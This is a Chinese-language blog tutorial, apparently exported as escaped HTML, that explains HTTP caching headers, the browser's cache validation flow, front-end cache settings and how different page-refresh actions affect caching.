title=\"2.Cache-control\"></a>2.Cache-control</h4><ul>\n<li><p><strong>public/private</strong></p>\n<p><code>public</code>表明响应可以被任何对象（包括：发送请求的客户端，代理服务器，等等）缓存。</p>\n<p><code>private</code>表明响应只能被单个用户缓存，不能作为共享缓存（即代理服务器不能缓存它）。</p>\n</li>\n<li><p><strong>max-age</strong></p>\n<p>值为一个毫秒数，表示缓存过期的相对时间，优先级高于Expires</p>\n</li>\n<li><p><strong>s-maxage=<seconds></seconds></strong></p>\n<p>覆盖max-age 或者 Expires 头，但是仅适用于共享缓存(比如各个代理)，并且私有缓存中它被忽略。</p>\n</li>\n<li><p><strong>no-cache</strong></p>\n<p>允许保存缓存副本 ，但是不能直接使用缓存副本，必须先去服务器提交验证请求，验证是否过期、已修改，如果验证没有过期、没有修改，即返回304状态，就可以使用缓存副本</p>\n</li>\n<li><p><strong>no-store</strong>：不允许保存缓存副本</p>\n</li>\n<li><p><strong>must-revalidate</strong></p>\n<p>缓存必须在使用之前验证旧资源的状态，并且不可使用过期资源。和no-cache比较相似</p>\n</li>\n<li><p><strong>min-fresh=<seconds></seconds></strong></p>\n<p>表示客户端希望在指定的时间内获取最新的响应。</p>\n</li>\n</ul>\n<p>若报文中同时出现了 Pragma、Expires 和 Cache-Control，会以 Cache-Control 为准，其它Cache-Control值略</p>\n<h4 id=\"3-Etag-If-None-Match\"><a href=\"#3-Etag-If-None-Match\" class=\"headerlink\" title=\"3.Etag / If-None-Match\"></a>3.Etag / If-None-Match</h4><ul>\n<li>服务器端为资源打的一个标记，标记资源有无修改，服务端资源修改后就修改Etag值</li>\n<li>“W\\”开头的Etag表示开启弱校验，当有了较多修改之后才会修改Etag值，默认使用强校验，即按字节进行对比</li>\n</ul>\n<h4 id=\"4-Last-Modified-If-Modified-Since\"><a href=\"#4-Last-Modified-If-Modified-Since\" class=\"headerlink\" title=\"4.Last-Modified / If-Modified-Since\"></a>4.Last-Modified / If-Modified-Since</h4><ul>\n<li>Last-Modified标记资源最后被修改的时间，是一个GMT格式的时间值</li>\n<li>如果在服务器上，一个资源被修改了，但其实际内容根本没发生改变，会因为Last-Modified时间匹配不上而返回了整个实体给客户端<em>（即使客户端缓存里有个一模一样的资源）</em>，所以通常配合Etag一起使用，可以达到较好的控制缓存的效果</li>\n<li>如果 Last-Modified 和 ETag 同时被使用，则要求它们的验证都必须通过才会返回304，若其中某个验证没通过，则服务器会按常规返回资源实体及200状态码。</li>\n</ul>\n<h3 id=\"2-辅助字段：\"><a href=\"#2-辅助字段：\" class=\"headerlink\" title=\"2. 辅助字段：\"></a>2. 辅助字段：</h3><h4 id=\"1-Vary\"><a href=\"#1-Vary\" class=\"headerlink\" title=\"1.Vary\"></a>1.Vary</h4><p>参考<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching_FAQ\" target=\"_blank\" rel=\"noopener\">MDN|HTTP缓存</a></p>\n<p>控制代理服务器直接使用缓存资源返回还是向源服务器发起请求。当缓存服务器收到一个请求，只有当前的请求和原始（缓存）的请求头跟缓存的响应头里的Vary都匹配，才能使用缓存的响应。</p>\n<p><img src=\"https://mdn.mozillademos.org/files/13769/HTTPVary.png\" alt=\"The Vary header leads cache to use more HTTP headers as key for the cache.\"></p>\n<p>使用vary头有利于内容服务的动态多样性。例如，使用Vary: User-Agent头，缓存服务器需要通过UA判断是否使用缓存的页面。如果需要区分移动端和桌面端的展示内容，利用这种方式就能避免在不同的终端展示错误的布局。另外，它可以帮助google或者其他搜索引擎更好地发现页面的移动版本，并且告诉搜索引擎没有引入<a href=\"https://en.wikipedia.org/wiki/Cloaking\" target=\"_blank\" rel=\"noopener\">Cloaking</a>。</p>\n<h4 id=\"2-Date和Age\"><a href=\"#2-Date和Age\" class=\"headerlink\" title=\"2.Date和Age\"></a>2.Date和Age</h4><p>Date 是原服务器发送该资源响应报文的时间（GMT格式），如果你发现 Date 的时间与“当前时间”差别较大，或者连续F5刷新发现 Date 的值都没变化，则说明你当前请求是命中了代理服务器的缓存。</p>\n<p>Age表示资源在代理服务器中存在的时间<em>（秒）</em>，如文件被修改或替换，Age会重新由0开始累计。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">静态资源Age + 静态资源Date = 原服务端Date</span><br></pre></td></tr></table></figure>\n<p>不过这条规则也不一定准确，特别是当原服务器经常修改系统时间的情况下。</p>\n<h2 id=\"二、缓存判断流程\"><a href=\"#二、缓存判断流程\" class=\"headerlink\" title=\"二、缓存判断流程\"></a>二、缓存判断流程</h2><p>参考<a href=\"https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching?hl=zh-cn\" target=\"_blank\" rel=\"noopener\">Google Developer HTTP缓存</a></p>\n<p><img src=\"http://7xpsmd.com1.z0.glb.clouddn.com/16-2-23/28130284.jpg\" alt=\"缓存决策树\"></p>\n<p>这个图可以说是设置缓存的参考策略，也可以据此判断浏览器判断是否使用缓存的大概流程：</p>\n<ol>\n<li><p>由Expires、Pragma、max-age等判断缓存是否过期，未过期直接使用缓存，已过期进行下一步</p>\n</li>\n<li><p>发起请求，请求头附带If-None-Match和If-Modified-Since，服务器由If-Modified-Since与其Last-Modified对比，如果不一致直接反回新版本的资源，否则需要再判断If-None-Match和Etag是否一致，如果不一致直接返回新版本资源，否则返回304状态码，浏览器就可以直接使用本地的缓存副本</p>\n</li>\n</ol>\n<p><img src=\"http://7xpsmd.com1.z0.glb.clouddn.com/16-2-23/8668139.jpg\" alt=\"浏览器的缓存判断流程\"></p>\n<p>另外需要注意的是，Chrome浏览器中，当缓存未过期直接使用缓存时，在Dev Tools的network选项卡中显示的是200 OK (from cache)。</p>\n<h2 id=\"三、前端设置\"><a href=\"#三、前端设置\" class=\"headerlink\" title=\"三、前端设置\"></a>三、前端设置</h2><h3 id=\"1-HTTP-header字段设置\"><a href=\"#1-HTTP-header字段设置\" class=\"headerlink\" title=\"1. HTTP header字段设置\"></a>1. HTTP header字段设置</h3><p>涉及到前端人员需要设置的HTTP header字段有哪些呢？通过前面按照能否被请求头、响应头支持这一标准进行的分类中，我们知道请求首部字段有：If-Match / If-None-Match、If-Modified-Since / If-Unmodified-Since，这几个值通常是首先服务器发回Etag、Last-Modified，然后浏览器自动加在请求头里面的，所以一般不用前端人员进行设置。<strong>通用首部字段有：Cache-Control、Pragma，也就是说作为前端人员，可以通过对这两个字段进行设置以控制缓存。</strong>（TODO）</p>\n<h3 id=\"2-Meta-http-equiv设置缓存\"><a href=\"#2-Meta-http-equiv设置缓存\" class=\"headerlink\" title=\"2. Meta http-equiv设置缓存\"></a>2. Meta http-equiv设置缓存</h3><p>HTML4中支持在meta标签的http-equiv属性中使用http头部缓存控制字段，包括Expires、Pragma、Cache-Control等。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;meta http-equiv=&quot;Cache-Control&quot; content=&quot;no-cache, no-store, must-revalidate&quot; /&gt;</span><br><span class=\"line\">&lt;meta http-equiv=&quot;Pragma&quot; content=&quot;no-cache&quot; /&gt;</span><br><span class=\"line\">&lt;meta http-equiv=&quot;Expires&quot; content=&quot;0&quot; /&gt;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>The <a href=\"https://www.w3.org/TR/html4/struct/global.html#adef-http-equiv\" target=\"_blank\" rel=\"noopener\">http-equiv</a> attribute can be used in place of the name attribute and has a special significance when documents are retrieved via the Hypertext Transfer Protocol (HTTP). HTTP servers may use the property name specified by the <a href=\"https://www.w3.org/TR/html4/struct/global.html#adef-http-equiv\" target=\"_blank\" rel=\"noopener\">http-equiv</a> attribute to create an <a href=\"https://www.w3.org/TR/html4/references.html#ref-RFC822\" target=\"_blank\" rel=\"noopener\">[RFC822]</a>-style header in the HTTP response. Please see the HTTP specification (<a href=\"https://www.w3.org/TR/html4/references.html#ref-RFC2616\" target=\"_blank\" rel=\"noopener\">[RFC2616]</a>) for details on valid HTTP headers.</p>\n</blockquote>\n<p>参考自<a href=\"https://www.w3.org/TR/html4/struct/global.html#h-7.4.4\" target=\"_blank\" rel=\"noopener\">w3.org | HTML4 | META and HTTP headers</a></p>\n<p>HTML5中已经不再包含这样的用法。参考自<a href=\"https://dev.w3.org/html5/spec-preview/the-meta-element.html#pragma-directives\" target=\"_blank\" rel=\"noopener\">w3.org | HTML5 | META Pragma directives</a></p>\n<p>当同时在meta标签中设置了缓存控制字段并在HTTP header中设置了这些字段时，会优先使用HTTP header字段。另外有的代理服务器可能会不认这个设置，为了避免造成冲突和混乱，建议只使用HTTP header设置缓存。另外META http-equiv适用于在file:// 本地文件中使用。</p>\n<blockquote>\n<p><strong><a href=\"https://stackoverflow.com/questions/49547/how-to-control-web-page-caching-across-all-browsers\" target=\"_blank\" rel=\"noopener\">HTML meta tags vs HTTP response headers</a></strong></p>\n<p>Important to know is that when a HTML page is served over a HTTP connection, and a header is present in <strong>both</strong> the HTTP response headers and the HTML <code>&lt;meta http-equiv&gt;</code> tags, then the one specified in the HTTP response header will get precedence over the HTML meta tag. The HTML meta tag will only be used when the page is viewed from local disk file system via a <code>file://</code> URL. See also <a href=\"http://www.w3.org/TR/html4/charset.html#h-5.2.2\" target=\"_blank\" rel=\"noopener\">W3 HTML spec chapter 5.2.2</a>. Take care with this when you don’t specify them programmatically, because the webserver can namely include some default values.</p>\n<p>Generally, you’d better just <strong>not</strong> specify the HTML meta tags to avoid confusion by starters, and rely on hard HTTP response headers. Moreover, specifically those <code>&lt;meta http-equiv&gt;</code> tags are <a href=\"http://validator.w3.org/\" target=\"_blank\" rel=\"noopener\"><strong>invalid</strong></a> in HTML5. Only the <code>http-equiv</code> values listed in <a href=\"http://dev.w3.org/html5/spec-preview/the-meta-element.html#attr-meta-http-equiv\" target=\"_blank\" rel=\"noopener\">HTML5 specification</a> are allowed.</p>\n</blockquote>\n<h3 id=\"3-给静态资源加版本号Revved-Resource\"><a href=\"#3-给静态资源加版本号Revved-Resource\" class=\"headerlink\" title=\"3.给静态资源加版本号Revved Resource\"></a>3.给静态资源加版本号Revved Resource</h3><p>更多地利用缓存资源，可以提高网站的性能和相应速度。为了优化缓存，过期时间设置得尽量长是一种很好的策略。对于定期或者频繁更新的资源，这么做是比较稳妥的，但是对于那些长期不更新的资源会有点问题。这些固定的资源在一定时间内受益于这种长期保持的缓存策略，但一旦要更新就会很困难。特指网页上引入的一些js/css文件，当它们变动时需要尽快更新线上资源。</p>\n<p>web开发者发明了一种 Steve Sounders 称作加速（译者注：revving）的技术<a href=\"https://www.stevesouders.com/blog/2008/08/23/revving-filenames-dont-use-querystring/\" target=\"_blank\" rel=\"noopener\">[1]</a> 。不频繁更新的文件会使用特定的命名方式：在URL后面（通常是文件名后面）会加上版本号。加上版本号后的资源就被视作一个完全新的独立的资源，同时拥有一年甚至更长的缓存过期时长。但是这么做也存在一个弊端，所有引用这个资源的地方都需要更新链接。web开发者们通常会采用自动化构建工具在实际工作中完成这些琐碎的工作。当低频更新的资源（js/css）变动了，只用在高频变动的资源文件（html）里做入口的改动。</p>\n<h2 id=\"四、设置规则\"><a href=\"#四、设置规则\" class=\"headerlink\" title=\"四、设置规则\"></a>四、设置规则</h2><ol>\n<li><p>为基本不会变动的资源设置非常长的过期时间，例如Image、Fonts、jQuery库文件等，以年为单位，例如淘宝网的logo图片设置了一年的max-age值</p>\n</li>\n<li><p>为定时变动的资源设置中等过期时间，例如CSS文件、JS文件，以版本更替的时间间隔为参考进行设置，如果在过期时间之前需要发新版本，为避免用户仍访问本地副本（因为本地副本还未过期），可使用加版本号的做法</p>\n</li>\n<li><p>HTML文档不使用缓存或谨慎设定过期时间，因为其他资源（图片、CSS、JavaScript 等）的请求都来自一个单一的HTML 文档，如果被缓存了，那么页面中包含的资源的文件名等信息都会一并被缓存，导致对它的更新难以确保立即对用户生效。（TODO）</p>\n</li>\n</ol>\n<p>一个网站，说白了就是HTML+JS+CSS+fonts+img 这几类文件，我们可以针对这几类文件做一些缓存层级</p>\n<table>\n<thead>\n<tr>\n<th>文件</th>\n<th>缓存层级</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>HTML</td>\n<td>Cache-Control: no-cache,must-revalidate</td>\n</tr>\n<tr>\n<td>JS</td>\n<td>Cache-Control:private,max-age=86400</td>\n</tr>\n<tr>\n<td>CSS</td>\n<td>Cache-Control:max-age=2629000</td>\n</tr>\n<tr>\n<td>img\\fonts</td>\n<td>Cache-Control:max-age=2629000</td>\n</tr>\n</tbody>\n</table>\n<p>上面只是一个简单的设置，要知道HTML是一定不能缓存的(大部分网页)。 缓存设置时间应该在你版本稳定之后设置，否则会得不偿失。 另外设置Cache-Control还可以配合ETag或者Last-Modified进行补偿验证，如果后面文件变化也可以及时反映出来。</p>\n<h2 id=\"五、用户刷新-访问行为\"><a href=\"#五、用户刷新-访问行为\" class=\"headerlink\" title=\"五、用户刷新/访问行为\"></a>五、用户刷新/访问行为</h2><p>我们可以把刷新/访问界面的手段分成以下几类：</p>\n<ul>\n<li><p><strong>在URI输入栏中输入然后回车 / 通过书签访问 / 通过浏览器前进后退按钮 / 通过页面中的a标签链接进行访问</strong></p>\n<p>返回<code>200 OK (from cache)</code>，浏览器发现该资源已经缓存了而且没有过期（通过Expires头部或者Cache-Control头部），没有跟服务器确认，而是直接使用了浏览器缓存的内容。</p>\n</li>\n<li><p><strong>F5 / 点击工具栏中的刷新按钮 / 右键菜单重新加载</strong></p>\n<p>F5会让浏览器<strong>无论如何都发一个HTTP Request给Server</strong>，即使先前的响应中有Expires头部。并且浏览器会在Request header中添加这样的字段:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">If-Modified-Since: Fri, 15 Jul 2016 04:11:51 GMT</span><br></pre></td></tr></table></figure>\n<p>其中Cache-Control是Chrome强制加上的，而If-Modified-Since是因为获取该资源的时候包含了Last-Modified头部，浏览器会使用If-Modified-Since头部信息重新发送该时间以确认资源是否需要重新发送。 实际上Server没有修改这个文件，所以返回了一个<code>304(Not Modified)</code></p>\n</li>\n<li><p><strong>Ctl+F5</strong></p>\n<p>Ctrl+F5要的是<strong>彻底的从Server拿一份新的资源过来</strong>，所以不光要发送HTTP request给Server，而且这个请求里面连If-Modified-Since/If-None-Match都没有，这样就逼着Server不能返回304，而是把整个资源原原本本地返回一份</p>\n<p>实际上，为了保证拿到的是从Server上最新的，Ctrl+F5不只是去掉了If-Modified-Since/If-None-Match，还需要添加一些HTTP Headers。按照HTTP/1.1协议，Cache不光只是存在Browser终端，从Browser到Server之间的中间节点(比如Proxy)也可能扮演Cache的作用，为了防止获得的只是这些中间节点的Cache，需要告诉他们，别用自己的Cache敷衍我，往Upstream的节点要一个最新的copy吧。<br>在Chrome 51 中会包含两个头部信息， 作用就是让中间的Cache对这个请求失效，这样返回的绝对是新鲜的资源。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cache-Control: no-cache</span><br><span class=\"line\">Pragma: no-cache</span><br></pre></td></tr></table></figure>\n<p>参考自<a href=\"http://imweb.io/topic/5795dcb6fb312541492eda8c\" target=\"_blank\" rel=\"noopener\">HTTP缓存控制小结</a></p>\n</li>\n</ul>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ol>\n<li><a href=\"https://zhuanlan.zhihu.com/p/24467558\" target=\"_blank\" rel=\"noopener\">【腾讯Bugly干货分享】彻底弄懂 Http 缓存机制 - 基于缓存策略三要素分解法</a></li>\n<li><a href=\"https://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html\" target=\"_blank\" rel=\"noopener\">rfc2616 14.Header Field Definitions</a></li>\n<li><a href=\"http://www.cnblogs.com/vajoy/p/5341664.html\" target=\"_blank\" rel=\"noopener\">浅谈浏览器http的缓存机制-Vajoy</a></li>\n<li><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching_FAQ\" target=\"_blank\" rel=\"noopener\">MDN | HTTP缓存</a></li>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers\" target=\"_blank\" rel=\"noopener\">MDN | HTTP headers</a></li>\n<li><a href=\"https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching?hl=zh-cn\" target=\"_blank\" rel=\"noopener\">Google Developer HTTP缓存</a></li>\n<li><a href=\"https://www.renfei.org/blog/http-caching.html\" target=\"_blank\" rel=\"noopener\">网站优化：浏览器缓存控制简介及配置策略</a></li>\n<li><a href=\"http://imweb.io/topic/5795dcb6fb312541492eda8c\" target=\"_blank\" rel=\"noopener\">HTTP缓存控制小结–总结了刷新页面的不同方式的影响</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000004486640\" target=\"_blank\" rel=\"noopener\">浏览器的缓存</a></li>\n<li><a href=\"https://www.w3.org/TR/html4/struct/global.html#h-7.4.4\" target=\"_blank\" rel=\"noopener\">w3.org | HTML4 | META and HTTP headers</a></li>\n<li><a href=\"https://dev.w3.org/html5/spec-preview/the-meta-element.html#pragma-directives\" target=\"_blank\" rel=\"noopener\">w3.org | HTML5 | META Pragma directives</a></li>\n<li><a href=\"https://stackoverflow.com/questions/49547/how-to-control-web-page-caching-across-all-browsers\" target=\"_blank\" rel=\"noopener\">HTML meta tags vs HTTP response headers</a></li>\n<li><a href=\"http://imweb.io/topic/5795dcb6fb312541492eda8c\" target=\"_blank\" rel=\"noopener\">HTTP缓存控制小结</a></li>\n</ol>\n<p><strong>技术博客为了总结整理知识和帮助别人</strong></p>\n","site":{"data":{}},"excerpt":"<p>网上介绍HTTP缓存机制的博客思路通常是挨个介绍HTTP缓存涉及的多个字段，这样通读下来感觉印象不深刻，并且缺少大局观，本文将尝试从更总览的角度进行总结和概括，以帮助建立知识体系。</p>","more":"<blockquote>\n<p>by MaryTien from  <a href=\"http://luckymona.github.com\" target=\"_blank\" rel=\"noopener\">http://supermaryy.com</a></p>\n</blockquote>\n<h2 id=\"前言及缓存字段分类\"><a href=\"#前言及缓存字段分类\" class=\"headerlink\" title=\"前言及缓存字段分类\"></a>前言及缓存字段分类</h2><p>前端涉及到缓存这一概念的地方包括HTTP缓存、以<code>localStorage</code>为代表的本地存储缓存（<code>sessionStorage</code>、<code>indexDB</code>、<code>web SQL</code>等），本文主要介绍HTTP缓存。HTTP请求中只有GET请求可以被缓存。</p>\n<p>网上介绍HTTP缓存机制的博客思路通常是挨个介绍HTTP缓存涉及的多个字段，这样通读下来感觉印象不深刻，并且缺少大局观，本文将尝试从更总览的角度进行总结，阅读这篇文章可以帮助你产生一点大菊观，明白轻重缓急，如果看了却产生不了，那你当我是浮夸吧，夸张只因我孩怕XDD。。</p>\n<p>缓存是一种保存资源副本并在下次请求时直接使用该副本的技术。设置缓存的好处：减少资源显示时间提升性能；减少服务器压力。HTTP缓存机制使用多个字段来实现缓存控制，把这些字段进行分类有利于记忆和加深理解，经过梳理总结我发现大家会对这些字段有以下几种分类方法：</p>\n<h3 id=\"1-按照缓存判断的执行过程，分为：\"><a href=\"#1-按照缓存判断的执行过程，分为：\" class=\"headerlink\" title=\"1. 按照缓存判断的执行过程，分为：\"></a>1. 按照缓存判断的执行过程，分为：</h3><p>参考自<a href=\"https://zhuanlan.zhihu.com/p/24467558\" target=\"_blank\" rel=\"noopener\">【腾讯Bugly干货分享】彻底弄懂 Http 缓存机制 - 基于缓存策略三要素分解法</a></p>\n<ul>\n<li><p>缓存存储策略：<code>Cache-Control: public、private、no-cache、max-age、no-store</code></p>\n<p>前4项都可以缓存数据到本地，后者 <code>no-store</code> 则不会在客户端缓存任何响应数据。</p>\n</li>\n<li><p>缓存过期策略：<code>Expires</code>、<code>Cache-Control</code>设置<code>max-age</code>、<code>no-cache</code>的情况</p>\n</li>\n<li><p>缓存对比策略：<code>Etag/If-None-Match</code>、<code>Last-Modified/If-Modified-Since</code></p>\n</li>\n</ul>\n<p>其中<code>max-age</code>和<code>no-cache</code>是个混合体，可以同时设置两个类别的内容，既包含缓存存储策略，也包含缓存过期策略，<code>Cache-Control:max-age=3600</code>相当于</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cache-Control:private/public</span><br><span class=\"line\">Expires:&lt;当前时间&gt; + 3600</span><br></pre></td></tr></table></figure>\n<p><code>Cache-Control:no-cache</code>相当于<code>Cache-Control:max-age=0</code>，相当于</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Cache-Control:private/publice</span><br><span class=\"line\">Expires:&lt;当前时间&gt;</span><br></pre></td></tr></table></figure>\n<p>在这种分类下，浏览器会依次根据<strong>是否存储、是否过期、是否对比一致</strong>来进行缓存判断，如果设置时缺失某一项，浏览器会根据约定好的规则为这一项设置默认值。例如没有设定具体过期时间时，浏览器会根据以下<strong>启发式缓存过期策略</strong>设定过期时间：</p>\n<p><strong>把响应头中的Date字段和Last-Modified的差值的10%作为max-age的值，也就是作为缓存有效期</strong></p>\n<h3 id=\"2-按照HTTP不同版本的字段，分为：\"><a href=\"#2-按照HTTP不同版本的字段，分为：\" class=\"headerlink\" title=\"2.按照HTTP不同版本的字段，分为：\"></a>2.按照HTTP不同版本的字段，分为：</h3><ul>\n<li><p>HTTP1.0中的字段：Pragma、Expires</p>\n</li>\n<li><p>HTTP1.1中的字段：Cache-Control、Etag / If-None-Match、Last-Modified / If-Modified-Since等</p>\n<p>这种分类主要强调的是两点：</p>\n<ol>\n<li>关于Pragma：设置了Pragma就相当于设置了Cache-Control：no-cache，但是HTTP响应头不支持这个属性，所以它不能拿来完全替代HTTP/1.1中定义的Cache-control头。通常定义Pragma以向后兼容基于HTTP/1.0的客户端，如低版本IE浏览器。</li>\n<li>同时设置了max-age和Expires的情况下，Expires被覆盖，以max-age为准</li>\n</ol>\n</li>\n</ul>\n<h3 id=\"3-按照使用频率，分为：\"><a href=\"#3-按照使用频率，分为：\" class=\"headerlink\" title=\"3.按照使用频率，分为：\"></a>3.按照使用频率，分为：</h3><ul>\n<li>主要字段：Expires、Cache-Control、Etag / If-None-Match、Last-Modified / If-Modified-Since</li>\n<li>辅助字段：Vary、Date、Age</li>\n</ul>\n<h3 id=\"4-按照能否被请求头、响应头支持，分为：\"><a href=\"#4-按照能否被请求头、响应头支持，分为：\" class=\"headerlink\" title=\"4.按照能否被请求头、响应头支持，分为：\"></a>4.按照能否被请求头、响应头支持，分为：</h3><p>参考自<a href=\"https://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html\" target=\"_blank\" rel=\"noopener\">rfc2616 14.Header Field Definitions</a></p>\n<p>​           <a href=\"http://www.cnblogs.com/vajoy/p/5341664.html\" target=\"_blank\" rel=\"noopener\">浅谈浏览器http的缓存机制-Vajoy</a></p>\n<ul>\n<li><p>请求头字段(request-header)：If-Match、If-None-Match、If-Modified-Since、If-Unmodified-Since</p>\n</li>\n<li><p>响应头字段(response-header)：Age、Etag</p>\n</li>\n<li><p>通用头部字段(general-header)：Cache-Control、Date、Pragma</p>\n</li>\n<li><p>实体首部字段(entity-header )：Expires、Last-Modified、</p>\n</li>\n</ul>\n<p>实体首部字段定义：For entity-header fields, both sender and recipient refer to either the client or the server, depending on who sends and who receives the entity。在我理解，这样也就是说Client或Server可以作为接收端或发送端，具体取决于它们在一次首发过程中扮演的角色，也就是说既可以出现在请求头中也可以出现在响应头中吗？这点还不太理解。（TODO）</p>\n<p>以下是表格：</p>\n<p>   <strong>1. 通用首部字段</strong>（就是请求报文和响应报文都能用上的字段）<br>   <img src=\"https://images2015.cnblogs.com/blog/561179/201604/561179-20160401161150504-1030837643.png\" alt=\"img\"></p>\n<p>   <strong>2. 请求首部字段</strong><br>   <img src=\"https://images2015.cnblogs.com/blog/561179/201604/561179-20160401161240301-2050921595.png\" alt=\"img\"></p>\n<p>   <strong>3. 响应首部字段</strong><br>   <img src=\"https://images2015.cnblogs.com/blog/561179/201604/561179-20160401161311394-1246877214.png\" alt=\"img\"></p>\n<p>   <strong>4. 实体首部字段</strong><br>   <img src=\"https://images2015.cnblogs.com/blog/561179/201604/561179-20160401171410441-767100632.png\" alt=\"img\"></p>\n<p>但是，MDN上说HTTP响应头不支持Pragma（TODO），并且通常Last-Modified会用在响应头里面。</p>\n<h2 id=\"一、常用缓存字段\"><a href=\"#一、常用缓存字段\" class=\"headerlink\" title=\"一、常用缓存字段\"></a>一、常用缓存字段</h2><h3 id=\"1-主要字段：\"><a href=\"#1-主要字段：\" class=\"headerlink\" title=\"1. 主要字段：\"></a>1. 主要字段：</h3><h4 id=\"1-Expires\"><a href=\"#1-Expires\" class=\"headerlink\" title=\"1.Expires\"></a>1.Expires</h4><ul>\n<li>HTTP1.0时期的缓存过期控制字段，是相对于服务器时间的绝对时间，不同服务器之间的时间设置可能不同，这种不一致存在隐患</li>\n<li>值为GMT格式的日期，设定在当前时间之前相当于立即过期，相当于Cache-Control：no-cache</li>\n<li>与Cache-Control：max-age=&lt;毫秒数&gt;共存时，被其覆盖并失效</li>\n<li>Pragma与Expires共存时，Pragma胜出，Expires失效</li>\n</ul>\n<h4 id=\"2-Cache-control\"><a href=\"#2-Cache-control\" class=\"headerlink\" title=\"2.Cache-control\"></a>2.Cache-control</h4><ul>\n<li><p><strong>public/private</strong></p>\n<p><code>public</code>表明响应可以被任何对象（包括：发送请求的客户端，代理服务器，等等）缓存。</p>\n<p><code>private</code>表明响应只能被单个用户缓存，不能作为共享缓存（即代理服务器不能缓存它）。</p>\n</li>\n<li><p><strong>max-age</strong></p>\n<p>值为一个毫秒数，表示缓存过期的相对时间，优先级高于Expires</p>\n</li>\n<li><p><strong>s-maxage=<seconds></seconds></strong></p>\n<p>覆盖max-age 或者 Expires 头，但是仅适用于共享缓存(比如各个代理)，并且私有缓存中它被忽略。</p>\n</li>\n<li><p><strong>no-cache</strong></p>\n<p>允许保存缓存副本 ，但是不能直接使用缓存副本，必须先去服务器提交验证请求，验证是否过期、已修改，如果验证没有过期、没有修改，即返回304状态，就可以使用缓存副本</p>\n</li>\n<li><p><strong>no-store</strong>：不允许保存缓存副本</p>\n</li>\n<li><p><strong>must-revalidate</strong></p>\n<p>缓存必须在使用之前验证旧资源的状态，并且不可使用过期资源。和no-cache比较相似</p>\n</li>\n<li><p><strong>min-fresh=<seconds></seconds></strong></p>\n<p>表示客户端希望在指定的时间内获取最新的响应。</p>\n</li>\n</ul>\n<p>若报文中同时出现了 Pragma、Expires 和 Cache-Control，会以 Cache-Control 为准，其它Cache-Control值略</p>\n<h4 id=\"3-Etag-If-None-Match\"><a href=\"#3-Etag-If-None-Match\" class=\"headerlink\" title=\"3.Etag / If-None-Match\"></a>3.Etag / If-None-Match</h4><ul>\n<li>服务器端为资源打的一个标记，标记资源有无修改，服务端资源修改后就修改Etag值</li>\n<li>“W\\”开头的Etag表示开启弱校验，当有了较多修改之后才会修改Etag值，默认使用强校验，即按字节进行对比</li>\n</ul>\n<h4 id=\"4-Last-Modified-If-Modified-Since\"><a href=\"#4-Last-Modified-If-Modified-Since\" class=\"headerlink\" title=\"4.Last-Modified / If-Modified-Since\"></a>4.Last-Modified / If-Modified-Since</h4><ul>\n<li>Last-Modified标记资源最后被修改的时间，是一个GMT格式的时间值</li>\n<li>如果在服务器上，一个资源被修改了，但其实际内容根本没发生改变，会因为Last-Modified时间匹配不上而返回了整个实体给客户端<em>（即使客户端缓存里有个一模一样的资源）</em>，所以通常配合Etag一起使用，可以达到较好的控制缓存的效果</li>\n<li>如果 Last-Modified 和 ETag 同时被使用，则要求它们的验证都必须通过才会返回304，若其中某个验证没通过，则服务器会按常规返回资源实体及200状态码。</li>\n</ul>\n<h3 id=\"2-辅助字段：\"><a href=\"#2-辅助字段：\" class=\"headerlink\" title=\"2. 辅助字段：\"></a>2. 辅助字段：</h3><h4 id=\"1-Vary\"><a href=\"#1-Vary\" class=\"headerlink\" title=\"1.Vary\"></a>1.Vary</h4><p>参考<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching_FAQ\" target=\"_blank\" rel=\"noopener\">MDN|HTTP缓存</a></p>\n<p>控制代理服务器直接使用缓存资源返回还是向源服务器发起请求。当缓存服务器收到一个请求，只有当前的请求和原始（缓存）的请求头跟缓存的响应头里的Vary都匹配，才能使用缓存的响应。</p>\n<p><img src=\"https://mdn.mozillademos.org/files/13769/HTTPVary.png\" alt=\"The Vary header leads cache to use more HTTP headers as key for the cache.\"></p>\n<p>使用vary头有利于内容服务的动态多样性。例如，使用Vary: User-Agent头，缓存服务器需要通过UA判断是否使用缓存的页面。如果需要区分移动端和桌面端的展示内容，利用这种方式就能避免在不同的终端展示错误的布局。另外，它可以帮助google或者其他搜索引擎更好地发现页面的移动版本，并且告诉搜索引擎没有引入<a href=\"https://en.wikipedia.org/wiki/Cloaking\" target=\"_blank\" rel=\"noopener\">Cloaking</a>。</p>\n<h4 id=\"2-Date和Age\"><a href=\"#2-Date和Age\" class=\"headerlink\" title=\"2.Date和Age\"></a>2.Date和Age</h4><p>Date 是原服务器发送该资源响应报文的时间（GMT格式），如果你发现 Date 的时间与“当前时间”差别较大，或者连续F5刷新发现 Date 